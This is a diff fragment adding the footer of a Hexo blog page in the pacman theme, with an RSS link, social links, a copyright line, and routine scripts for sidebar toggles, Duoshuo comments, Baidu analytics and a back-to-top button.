+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
